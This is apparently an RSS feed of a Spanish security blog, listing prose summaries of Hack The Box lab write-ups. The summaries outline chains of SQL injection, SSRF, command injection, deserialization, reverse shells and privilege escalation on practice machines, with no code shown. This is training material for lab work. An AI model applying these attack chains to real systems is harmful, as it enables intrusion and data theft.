<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Blog de 7Rocky. Ciberseguridad y Mates</title><link>https://7rocky.github.io/</link><description>Recent content on Blog de 7Rocky. Ciberseguridad y Mates</description><generator>Hugo</generator><language>es</language><lastBuildDate>Sat, 25 May 2024 02:11:19 +0200</lastBuildDate><atom:link href="https://7rocky.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>RegistryTwo</title><link>https://7rocky.github.io/htb/registrytwo/</link><pubDate>Sat, 03 Feb 2024 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/registrytwo/</guid><description>Hack The Box. Linux. Máquina insana. Esta máquina expone una aplicación web que permite crear dominios personalizados con código HTML. Además, hay un registro de Docker expuesto en el que podemos descargar &lt;em>blobs&lt;/em> de imágenes de Docker después de obtener un &lt;em>token&lt;/em> JWT adecuado. La aplicación web ejecuta un archivo WAR con Tomcat, podemos descompilarlo y ver que consulta un servidor RMI. Dado que Tomcat está detrás de un &lt;em>proxy&lt;/em> inverso de nginx, podemos acceder a algunos &lt;em>servlets&lt;/em> sensibles de Tomcat para modificar nuestra sesión y establecer permisos de administrador en la aplicación web. Necesitamos esto para modificar la configuración de RMI utilizando una vulnerabilidad de asignación en masa y apuntar el servidor RMI a nosotros. Después de eso, podemos explotar una vulnerabilidad de deserialización insegura en Java para obtener RCE en un contenedor. Luego, podemos interactuar con el servidor RMI legítimo utilizando un reenvío de puertos. Este servidor nos permite leer archivos arbitrarios con un ataque de navegación de directorios. Podemos encontrar una contraseña en texto claro para el usuario &lt;code>developer&lt;/code>, que se reutiliza en SSH. Luego, &lt;code>root&lt;/code> ejecuta un archivo JAR para analizar archivos del sitio web de &lt;em>hosting&lt;/em> enviándolos a un servidor ClamAV. El problema aquí es que el JAR llama a las funciones del registro RMI, que se reinicia periódicamente. Por lo tanto, podemos elaborar un registro de RMI malicioso y una explotación para ganar una condición de carrera y ocupar el puerto, de modo que &lt;code>root&lt;/code> consulte nuestro servidor ClamAV falso. El resultado será que todos los archivos en &lt;code>/root&lt;/code> se pondrán en cuarentena dentro de un directorio legible, lo cual conduce a la escalada de privilegios</description></item><item><title>Sau</title><link>https://7rocky.github.io/htb/sau/</link><pubDate>Sat, 06 Jan 2024 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/sau/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una aplicación web que es vulnerable a SSRF, que puede usarse para leer el contenido de un servidor interno, que es vulnerable a inyección de comandos. Las dos vulnerabilidades se pueden encadenar para obtener RCE en la máquina. El usuario de bajos privilegios puede ejecutar &lt;code>systemctl&lt;/code> como &lt;code>root&lt;/code> usando &lt;code>sudo&lt;/code>, lo que conduce a la escalada de privilegios a través de &lt;code>less&lt;/code></description></item><item><title>Pilgrimage</title><link>https://7rocky.github.io/htb/pilgrimage/</link><pubDate>Sat, 25 Nov 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/pilgrimage/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web que expone un repositorio de Git. Podemos extraer el código fuente en PHP de la aplicación web y descubrir que usa ImageMagick por detrás para procesar imágenes subidas. La versión de ImageMagick tiene una vulnerabilidad de lectura de archivos locales que se puede usar para leer un archivo de base de datos SQLite y encontrar una contraseña en texto claro para &lt;code>emily&lt;/code>, que también se usa en SSH. Después de eso, encontramos que &lt;code>root&lt;/code> ejecuta un &lt;em>script&lt;/em> en Bash que usa &lt;code>binwalk&lt;/code> para eliminar &lt;em>malware&lt;/em> de los archivos de imagen subidos. La versión de &lt;code>binwalk&lt;/code> es vulnerable a ejecución remota de comandos, lo que conduce a la escalada de privilegios</description></item><item><title>Sandworm</title><link>https://7rocky.github.io/htb/sandworm/</link><pubDate>Sat, 18 Nov 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/sandworm/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que permite cifrar, descifrar y verificar firmas con PGP. El sitio web es vulnerable a SSTI en Flask, que es la forma de acceder a la máquina como &lt;code>atlas&lt;/code>. Sin embargo, este entorno es limitado debido a &lt;code>firejail&lt;/code>, pero podemos encontrar una contraseña en texto claro para entrar como &lt;code>silentobserver&lt;/code> por SSH. Como este usuario, podemos modificar un proyecto de Rust que se utiliza en otro proyecto de Rust que se ejecuta periódicamente como &lt;code>atlas&lt;/code>. Con este poder, podemos obtener acceso como &lt;code>atlas&lt;/code> nuevamente, pero fuera de &lt;code>firejail&lt;/code>. Finalmente, dado que &lt;code>firejail&lt;/code> es un binario SUID, podemos usar un &lt;em>exploit&lt;/em> público para convertirnos en &lt;code>root&lt;/code></description></item><item><title>Topology</title><link>https://7rocky.github.io/htb/topology/</link><pubDate>Sat, 04 Nov 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/topology/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene un sitio web que permite generar ecuaciones con LaTeX. Con esta funcionalidad podemos leer archivos arbitrarios del servidor con técnicas de inyección de LaTeX y encontrar un el &lt;em>hash&lt;/em> de una contraseña para otro subdominio. Esta contraseña se reutiliza en SSH. Después de eso, &lt;code>root&lt;/code> está ejecutando scripts con &lt;code>gnuplot&lt;/code> periódicamente, lo que lleva a la escalada de privilegios</description></item><item><title>Intentions</title><link>https://7rocky.github.io/htb/intentions/</link><pubDate>Sat, 14 Oct 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/intentions/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina tiene un sitio web con una API vulnerable a SQLi de segundo orden. Luego, hay un mecanismo de autenticación que solo requiere del &lt;em>hash&lt;/em> de la contraseña, por lo que podemos tomar un &lt;em>hash&lt;/em> de la base de datos e iniciar sesión como administrador. Luego, hay una vulnerabilidad que involucra PHP e ImageMagick que conduce a RCE. Una vez en la máquina, podemos pivotar al usuario &lt;code>greg&lt;/code> analizando un repositorio de Git y encontrando credenciales en texto claro. Después de eso, se nos permite ejecutar un binario personalizado que aplica un &lt;em>hash&lt;/em> a una determinada longitud de un archivo y compara el resultado con un conjunto de hashes MD5 precomputados. Este binario tiene una &lt;em>capability&lt;/em> que permite leer archivos como &lt;code>root&lt;/code>, que puede usarse para extraer todo el contenido de cualquier archivo después de automatizar el proceso, qlo cual puede usarse para leer una clave privada de SSH para &lt;code>root&lt;/code></description></item><item><title>MonitorsTwo</title><link>https://7rocky.github.io/htb/monitorstwo/</link><pubDate>Sat, 02 Sep 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/monitorstwo/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene un servicio Cacti que es vulnerable a ejecución remota de comandos sin autenticación que otorga acceso a un contenedor de Docker. Aquí podemos encontrar credenciales en la base de datos y reutilizarlas para SSH en la máquina &lt;em>host&lt;/em>. Luego, descubrimos que la versión de Docker es vulnerable a un CVE. Para explotar esto, necesitamos ser &lt;code>root&lt;/code> en el contenedor y configurar un binario SUID para ejecutarlo desde la máquina &lt;em>host&lt;/em> mediante navegación de directorios para escalar privilegios</description></item><item><title>Stocker</title><link>https://7rocky.github.io/htb/stocker/</link><pubDate>Sat, 24 Jun 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/stocker/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticación. Luego, tenemos una funcionalidad para convertir un texto HTML en PDF, siendo capaces de realizar un ataque XSS del lado servidor para leer archivos del servidor, como el código fuente. Después encontramos una contraseña en texto claro que se reutiliza en SSH. Finalmente, un usuario puede ejecutar &lt;em>scripts&lt;/em> en Node.js con &lt;code>sudo&lt;/code> en una ruta que tiene un &lt;em>wildcard&lt;/em>. Para escalar privilegios hay que abusar de este &lt;em>wildcard&lt;/em></description></item><item><title>Escape</title><link>https://7rocky.github.io/htb/escape/</link><pubDate>Sat, 17 Jun 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/escape/</guid><description>Hack The Box. Windows. Máquina media. Esta máquina comparte un archivo PDF a través de SMB y muestra credenciales para acceder a Microsoft SQL Server. Aquí, podemos usar &lt;code>xp_dirtree&lt;/code> para enumerar un servidor externo SMB y romper el &lt;em>hash&lt;/em> NTLMv2. Después de eso, podemos acceder a la máquina, leer los registros de Microsoft SQL Server y descubrir la contraseña de otro usuario. Luego, encontramos algunas plantillas de certificados vulnerables que pueden ser abusadas para autenticarse como &lt;code>Administrator&lt;/code></description></item><item><title>Soccer</title><link>https://7rocky.github.io/htb/soccer/</link><pubDate>Sat, 10 Jun 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/soccer/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene una aplicación Tiny File Manager que nos permite cargar y ejecutar PHP, por lo que podemos obtener una &lt;em>reverse shell&lt;/em> como &lt;code>www-data&lt;/code>. En la máquina, podemos leer la configuración de nginx y encontrar otro subdominio. Este expone un servidor WebSocket que es vulnerable a &lt;em>Boolean-based Blind&lt;/em> SQLi. Al explotar SQLi, podemos encontrar credenciales en texto claro que se reutilizan en SSH. Finalmente, el usuario puede ejecutar &lt;code>dstat&lt;/code> como &lt;code>root&lt;/code> usando &lt;code>doas&lt;/code>, y podemos crear un &lt;em>plugin&lt;/em> para escalar privilegios</description></item><item><title>Bagel</title><link>https://7rocky.github.io/htb/bagel/</link><pubDate>Sat, 03 Jun 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/bagel/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que es vulnerable a lectura de archivos locales. Con esto, podemos leer el código fuente de la aplicación web y ver que hay un servidor WebSocket que usa C# .NET con una DLL para procesar los mensajes. Podemos descargar y aplicar ingeniería inversa a la DLL para leer el código fuente en C#. El programa deserializa los datos JSON y hay un fallo que nos permite reutilizar una clase del código para leer archivos arbitrarios del servidor. Con esto, podemos leer la clave privada de SSH de un usuario y luego cambiar a otro usuario con una contraseña que también aparecía en la DLL. Este usuario puede ejecutar &lt;code>dotnet&lt;/code> con &lt;code>sudo&lt;/code>, que puede usarse para escalar privilegios</description></item><item><title>Precious</title><link>https://7rocky.github.io/htb/precious/</link><pubDate>Sat, 20 May 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/precious/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una aplicación web que utiliza una herramienta para crear documentos PDF que es vulnerable a inyección de comandos, lo que conduce a ejecución remota de comandos (RCE). Luego, podemos encontrar credenciales en texto claro para cambiar a otro usuario. Y este usuario tiene permisos de &lt;code>sudo&lt;/code> para ejecutar un &lt;em>script&lt;/em> en Ruby que es vulnerable a deserialización insegura en YAML, que puede usarse para ejecutar comandos como &lt;code>root&lt;/code></description></item><item><title>Interface</title><link>https://7rocky.github.io/htb/interface/</link><pubDate>Sat, 13 May 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/interface/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web hecho en Next.js que expone un subdominio en la cabecera &lt;code>Content-Security-Policy&lt;/code>. Ahí, podemos enumerar dependencias de terceros como &lt;code>dompdf&lt;/code>. Esta es vulnerable a ejecución remota de comandos. Después de mucha enumeración para interactuar con &lt;code>dompdf&lt;/code>, encontramos una manera de obtener una &lt;em>reverse shell&lt;/em> en el sistema. Luego, el usuario &lt;code>root&lt;/code> ejecuta un &lt;em>script&lt;/em> cada minuto, y el &lt;em>script&lt;/em> es vulnerable a inyección de comandos, que debe explotarse agregando metadatos maliciosos a un archivo temporal. Al encadenar estos pasos, podemos obtener una &lt;em>reverse shell&lt;/em> como &lt;code>root&lt;/code></description></item><item><title>MetaTwo</title><link>https://7rocky.github.io/htb/metatwo/</link><pubDate>Sat, 29 Apr 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/metatwo/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene un sitio web de WordPress que utiliza un &lt;em>plugin&lt;/em> vulnerable a SQLi. Con este ataque podemos obtener &lt;em>hashes&lt;/em> de contraseñas y romper uno de ellos para obtener acceso al &lt;em>dashboard&lt;/em> de WordPress. La versión de WordPress es vulnerable a &lt;em>out-of-band&lt;/em> XXE utilizando un archivo WAV que permite leer archivos del servidor. Usando esta vulnerabilidad, podemos encontrar credenciales en texto claro para FTP. En este servicio tenemos otro archivo PHP con más credenciales en texto claro que son válidas para SSH. Una vez dentro de la máquina, encontramos algunas claves y mensajes PGP que se pueden descifrar para encontrar la contraseña de &lt;code>root&lt;/code></description></item><item><title>Investigation</title><link>https://7rocky.github.io/htb/investigation/</link><pubDate>Sat, 22 Apr 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/investigation/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que permite analizar los metadatos de un archivo de imagen con &lt;code>exiftool&lt;/code>. Sin embargo, la versión es vulnerable a inyección de comandos y se puede usar para acceder al sistema. Luego, encontramos algunos registros de eventos de Windows y una contraseña en texto claro como nombre de usuario, probablemente un error. Después de eso, obtenemos acceso como otro usuario que puede ejecutar un binario con &lt;code>sudo&lt;/code>, que por detrás ejecuta un &lt;em>script&lt;/em> en Perl que conduce a la escalada de privilegios</description></item><item><title>BroScience</title><link>https://7rocky.github.io/htb/broscience/</link><pubDate>Sat, 08 Apr 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/broscience/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web vulnerable a lectura de archivos locales que se puede usar para leer código PHP y encontrar una manera de activar una nueva cuenta. Luego, podemos usar un ataque de deserialización en PHP para obtener RCE. Después de eso, encontramos el &lt;em>hash&lt;/em> de una contraseña en la base de datos que puede ser descifrada y reutilizada en el sistema. Finalmente, hay una tarea Cron ejecutada por &lt;code>root&lt;/code> para renovar certificados de OpenSSL y el &lt;em>script&lt;/em> presenta una vulnerabilidad de inyección de comandos, lo que conduce a la escalada de privilegios</description></item><item><title>Vessel</title><link>https://7rocky.github.io/htb/vessel/</link><pubDate>Sat, 25 Mar 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/vessel/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina tiene un sitio web que expone un repositorio de Git. Aquí podemos leer el código fuente de la aplicación web y encontrar una manera de saltarnos la autenticación en MySQL con &lt;em>Type Juggling&lt;/em>. Luego, encontramos otro subdominio que tiene un &lt;em>exploit&lt;/em> público para obtener RCE. Después de eso, descubrimos una herramienta de generación de contraseñas en la que se puede aplicar ingeniería inversa para generar múltiples contraseñas y romper un documento PDF protegido por contraseña. Luego, obtenemos acceso a través de SSH y vemos que podemos usar &lt;code>sysctl&lt;/code> como &lt;code>root&lt;/code> con &lt;code>pinns&lt;/code> como binario SUID. Con esto, podemos modificar la configuración del kernel para ejecutar un &lt;em>script&lt;/em> arbitrario cuando un programa da un error de violación de segmento, lo que conduce a la escalada de privilegios</description></item><item><title>Forgot</title><link>https://7rocky.github.io/htb/forgot/</link><pubDate>Sat, 04 Mar 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/forgot/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que es vulnerable a envenenamiento de recuperación de contraseñas y envenenamiento de caché web. Ambas vulnerabilidades se pueden usar para obtener acceso a una cuenta normal y luego obtener la &lt;em>cookie&lt;/em> del administrador, respectivamente. Después de eso, podemos leer un &lt;em>ticket&lt;/em> con credenciales de SSH. Luego, podemos ejecutar un &lt;em>script&lt;/em> de &lt;em>Machine Learning&lt;/em> como &lt;code>root&lt;/code> usando &lt;code>sudo&lt;/code>, y hay una librería con una versión vulnerable donde podemos inyectar código Python para escalar privilegios</description></item><item><title>Awkward</title><link>https://7rocky.github.io/htb/awkward/</link><pubDate>Sat, 25 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/awkward/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web en Vue.js que expone un formulario de inicio de sesión que se puede saltar fácilmente. Luego encontramos una API que prueba la conectividad de otros sitios web, que puede explotarse utilizando &lt;em>Server-Side Request Forgery&lt;/em> para encontrar la documentación de la API. Allí tenemos código Node.js para analizar y ver cómo podemos saltar algunas validaciones para obtener información de los usuarios y romper el &lt;em>hash&lt;/em> de una contraseña. Después de eso, podemos iniciar sesión, obtener un &lt;em>token&lt;/em> JWT válido y romperlo para encontrar el secreto. Por lo tanto, podemos crear cualquier &lt;em>token&lt;/em> JWT, lo que significa que podemos inyectar cualquier &lt;em>payload&lt;/em> como información del &lt;em>token&lt;/em>. Usando este poder, podemos leer archivos arbitrarios del servidor explotando &lt;code>awk&lt;/code> y encontrar credenciales en texto claro dentro de un archivo comprimido. A continuación, podemos acceder por SSH y encontrar otro sitio web construido en PHP con dos vulnerabilidades. También hay una tarea Cron que toma información de un archivo CSV para enviar un correo electrónico. La clave aquí es inyectar un parámetro malicioso en el archivo CSV para que el comando &lt;code>mail&lt;/code> ejecute un &lt;em>script&lt;/em> malicioso, que lleva a la escalada de privilegios</description></item><item><title>RainyDay</title><link>https://7rocky.github.io/htb/rainyday/</link><pubDate>Sat, 18 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/rainyday/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web vulnerable a enumeración de usuarios. Luego, podemos hacer fuerza bruta a la contraseña de un usuario y ejecutar contenedores. Mediante un contenedor, podemos acceder a una web interna que tiene una API que muestra información sensible al explotar una vulnerabilidad de &lt;em>Type Juggling&lt;/em> y provee una función para usar expresiones regulares en archivos, por lo que podemos leer código fuente y la clave secreta de Flask. Luego, podemos falsificar una sesión del usuario &lt;code>jack&lt;/code> y descubrir que los contenedores de Docker permiten acceder a información de procesos de la máquina, por lo que podemos leer la clave privada de SSH de este usuario. Después, podemos ejecutar un intérprete de Python personalizado y escapar de la &lt;em>sandbox&lt;/em> para obtener una &lt;em>shell&lt;/em> como &lt;code>jack_adm&lt;/code>. Finalmente, hay una herramienta que genera &lt;em>hashes&lt;/em> con &lt;code>bcrypt&lt;/code>, y tenemos que abusar de una limitación de &lt;code>bcrypt&lt;/code> para extraer la pimienta secreta y romper el &lt;em>hash&lt;/em> de &lt;code>root&lt;/code> para escalar privilegios</description></item><item><title>Photobomb</title><link>https://7rocky.github.io/htb/photobomb/</link><pubDate>Sat, 11 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/photobomb/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene una aplicación web hecha con Sinatra que es vulnerable a inyección de comandos, que deriva en ejecución remota de comandos (RCE). El usuario tiene permisos de &lt;code>sudo&lt;/code> para ejecutar un &lt;em>script&lt;/em> en Bash que es vulnerable a &lt;code>PATH&lt;/code> &lt;em>hijacking&lt;/em>, y se puede utilizar para escalar privilegios</description></item><item><title>Ambassador</title><link>https://7rocky.github.io/htb/ambassador/</link><pubDate>Sat, 28 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/ambassador/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una instancia de Grafana que es vulnerable a &lt;em>Directory Path Traversal&lt;/em> sin autenticación. Así, podemos leer archivos del servidor y encontrar la contraseña para Grafana y para MySQL. Después de eso, podemos conectarnos a MySQL, que está expuesto, y encontrar otra contraseña para acceder a través de SSH. La máquina ejecuta &lt;code>consul&lt;/code> internamente con una configuración vulnerable. Después de encontrar un &lt;em>token&lt;/em> de autenticación en un repositorio de Git, podemos usar un &lt;em>exploit&lt;/em> para obtener RCE en &lt;code>consul&lt;/code> y ganar acceso como &lt;code>root&lt;/code></description></item><item><title>UpDown</title><link>https://7rocky.github.io/htb/updown/</link><pubDate>Sat, 21 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/updown/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que tiene un directorio de desarrollo y expone un repositorio de Git. Usando esto, podemos encontrar alguna funcionalidad que esté oculta excepto para los desarrolladores y que se pueda abusar para obtener RCE después de planificar el ataque y saltarnos las &lt;code>disable_functions&lt;/code> en PHP. En la máquina, hay un binario SUID compilado de un &lt;em>script&lt;/em> en Python, que puede ser abusado con un ataque de &lt;em>library hijacking&lt;/em>. Finalmente, el usuario puede ejecutar &lt;code>easy_install&lt;/code> con &lt;code>sudo&lt;/code>, lo que conduce a la escalada de privilegios</description></item><item><title>Shoppy</title><link>https://7rocky.github.io/htb/shoppy/</link><pubDate>Sat, 14 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/shoppy/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticación y listar hashes de contraseñas que se pueden romper. Luego, al enumerar subdominios encontramos una aplicación MatterMost a la que podemos entrar y ver credenciales de acceso por SSH. El primer usuario puede ejecutar un binario ELF personalizado que muestra más credenciales al usar una contraseña maestra. Finalmente, podemos escalar privilegios porque el segundo usuario pertenece al grupo docker</description></item><item><title>Health</title><link>https://7rocky.github.io/htb/health/</link><pubDate>Sat, 07 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/health/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una funcionalidad de webhook que parece vulnerable a Server-Side Request Forgery. Tras probar varios bypasses, vemos que el ataque de SSRF funciona mediante una redirección. Internamente, hay una versión de Gogs desactualizada que es vulnerable a SQLi. Una vez que tenemos un payload para extraer hashes de contraseñas de la base de datos, podemos obtenerlos y romperlos de la instanca de Gogs remota con SQLi a través de SSRF. Luego, conseguimos una conexión por SSH y descubrimos que podemos introducir rutas locales en la base de datos para leer archivos del servidor como root. En este write-up se utiliza un script en Python para realizar el ataque de SSRF y un programa en Go para romper los hashes de Gogs</description></item><item><title>RedPanda</title><link>https://7rocky.github.io/htb/redpanda/</link><pubDate>Sat, 26 Nov 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/redpanda/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una aplicación web hecha con Spring Boot que es vulnerable a Server-Side Template Injection con un formato particular. Luego, para escalar privilegios, es necesario analizar un programa en Java, añadir metadatos maliciosos a una imagen JPEG, añadir una Entidad Externa XML en un archivo XML controlado, romper la lógica de un analizador de logs y finalmente esperar a que root procese el archivo XML para leer su clave privada de SSH</description></item><item><title>Shared</title><link>https://7rocky.github.io/htb/shared/</link><pubDate>Sat, 12 Nov 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/shared/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una tienda de e-commerce que es vulnerable a SQLi. Con esta vulnerabilidad podemos obtener un hash de una contraseña que se reutiliza en SSH. Existe otro usuario que ejecuta ipython de forma periódica, por lo que podemos inyectar un archivo de configuración y ejecutar comandos. Este segundo usuario puede usar un binario compilado en Go que se conecta a Redis. Un análisis del binario revela una contraseña, por lo que nos podemos conectar a Redis y explotar un CVE para ejecutar código en Lua, escapar de la sandbox y ganar ejecución de comandos como root</description></item><item><title>Trick</title><link>https://7rocky.github.io/htb/trick/</link><pubDate>Sat, 29 Oct 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/trick/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene un servicio DNS que es vulnerable a un ataque de transferencia de zona que fuga un subdominio. Aquí podemos saltarnos la autenticación con SQLi y explotar un LFI. Con ambas vulnerabilidades encadenadas podemos acceder a la máquina. Luego, podemos encontrar otro subdominio que de nuevo es vulnerable a LFI, y con este obtenemos la clave privada de SSH de un usuario. Este usuario puede reiniciar fail2ban con sudo y modificar archivos de configuración</description></item><item><title>Faculty</title><link>https://7rocky.github.io/htb/faculty/</link><pubDate>Sat, 22 Oct 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/faculty/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una página web vulnerable a SQLi y salto de autenticación que lleva a otra página en la que podemos exportar contenido HTML a PDF. Existe una vulnerabilidad en la que podemos adjuntar archivos locales al fichero PDF y leer una contraseña reutilizada para SSH. Mediante sudo podemos ejecutar un script en Node.js como otro usuario y explotar una inyección de comandos. Este segundo usuario puede ejecutar GDB y además GDB tiene la capability cap_sys_ptrace activada, por lo que podemos depurar un proceso en ejecución por root y ejecutar código arbitrario</description></item><item><title>OpenSource</title><link>https://7rocky.github.io/htb/opensource/</link><pubDate>Sat, 08 Oct 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/opensource/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que expone su código fuente, siendo vulnerable a Directory Path Traversal. Con esta vulnerabilidad podemos leer los archivos necesarios para calcular el PIN de la consola de depuración de Flask y obtener ejecución remota de comandos en un contenedor Docker. Después, se necesita usar un reenvío de puertos para ver una instancia de Gitea y acceder con credenciales que se encuentran en un repositorio de Git. Aquí podemos ver la clave privada de SSH de un usuario de sistema. Existe una tarea Cron que confirma nuevos cambios de un repositorio Git que lleva a escalada de privilegios</description></item><item><title>Scanned</title><link>https://7rocky.github.io/htb/scanned/</link><pubDate>Sat, 10 Sep 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/scanned/</guid><description>Hack The Box. Linux. Máquina insana. Esta máquina tiene una página web que es capaz de analizar malware. Al analizar el código en C del sandbox, se ve que se puede utilizar un archivo de log para exfiltrar información por medio del servidor web, y también abusar de una mala configuración para escapar de chroot. Luego, podemos leer una base de datos SQLite y extraer el hash de una contraseña, que se reutiliza para SSH. Una vez en la máquina, se puede ejecutar un binario SUID desde la sandbox y copiar una librería compartida maliciosa para que el binario SUID ejecute Bash como root. Para comprometer esta máquina se necesitan conocimientos avanzados de Linux, programación en C y Bash, experiencia en auditoría de código y técnicas de evasión. En este write-up se utiliza un script en Bash con un programa en C embebido para listar directorios y leer archivos del servidor y también un programa en Go para romper el hash de una contraseña</description></item><item><title>Noter</title><link>https://7rocky.github.io/htb/noter/</link><pubDate>Sat, 03 Sep 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/noter/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una aplicación web hecha en Flask para gestionar notas en Markdown y PDF. Podemos extraer la clave secreta usada para firmar las cookies de sesión y falsificar cookies para enumerar usuarios. Una vez que tenemos un usuario privilegiado, podemos acceder al servidor FTP y analizar el código fuente de la aplicación web para descubrir una vulnerabilidad de inyección de comandos. Luego, podemos acceder a la máquina y ver que MySQL se ejecuta como root, lo cual permite la escalada de privilegios</description></item><item><title>Talkative</title><link>https://7rocky.github.io/htb/talkative/</link><pubDate>Sat, 27 Aug 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/talkative/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina es un sitio web que expone una aplicación Jamovi donde podemos obtener una &lt;em>reverse shell&lt;/em> en un contenedor de Docker. Aquí encontramos algunas credenciales para una aplicación Bolt CMS, y conseguimos acceso como administrador. Desde aquí podemos modificar una plantilla escribiendo código PHP y ganar acceso a otro contenedor. Este tiene conectividad con el puerto 22 de la máquina, por lo que podemos acceder a la máquina usando las credenciales anteriores por SSH. Luego, encontramos otro contenedor que ejecuta MongoDB, que contiene la base de datos de un servidor Rocket.Chat. En este punto, podemos crear una nueva cuenta en Rocket.Chat y asignarnos el rol de administrador modificando la entrada de la base de datos. Después de eso, podemos establecer una nueva integración para obtener RCE en el contenedor que gestiona Rocket.Chat. Finalmente, este contenedor tiene habilitada la &lt;em>capability&lt;/em> &lt;code>CAP_DAC_READ_SEARCH&lt;/code>, que nos permite leer archivos de la máquina &lt;em>host&lt;/em> como &lt;code>root&lt;/code> usando un &lt;em>exploit&lt;/em>. Además, el contenedor también es vulnerable a otro &lt;em>exploit&lt;/em> para escribir archivos arbitrarios como &lt;code>root&lt;/code> en la máquina &lt;em>host&lt;/em></description></item><item><title>Timelapse</title><link>https://7rocky.github.io/htb/timelapse/</link><pubDate>Sat, 20 Aug 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/timelapse/</guid><description>Hack The Box. Windows. Máquina fácil. Esta máquina presenta un entorno de Active Directory (AD) donde se puede encontrar un archivo cifrado ZIP mediante SMB. Podemos obtener la contraseña y obtener un archivo PFX con claves públicas y privadas para WinRM. De nuevo, se puede obtener la contraseña y conseguir las claves para conectarse a la máquina. Existe un historial de comandos en PowerShell donde se encuentra una contraseña para un miembro del grupo LAPS, el cual puede mostrar la contraseña de Administrator. Para comprometer esta máquina se necesitan conocimientos de enumeración y explotación en Windows</description></item><item><title>Retired</title><link>https://7rocky.github.io/htb/retired/</link><pubDate>Sat, 13 Aug 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/retired/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una página web en PHP que es vulnerable a navegación de directorios. Aquí encontramos un archivo PHP que espera que se suba un archivo para pasarlo a un servidor de sockets en local. Somos capaces de enumerar procesos y descargar el binario que ejecuta el servidor y ver que es vulnerable a Buffer Overflow. Una vez explotado, podemos pivotar a un usuario usando enlaces simbólicos. Y luego, se nos permite añadir formatos ejecutables personalizados, que puede ser explotado para convertirnos en root. Para comprometer esta máquina se necesitan técnicas sólidas de explotación de binarios y conceptos de Linux. En este write-up se utilizan exploits personalizados en Python para la intrusión</description></item><item><title>OverGraph</title><link>https://7rocky.github.io/htb/overgraph/</link><pubDate>Sat, 06 Aug 2022 00:00:00 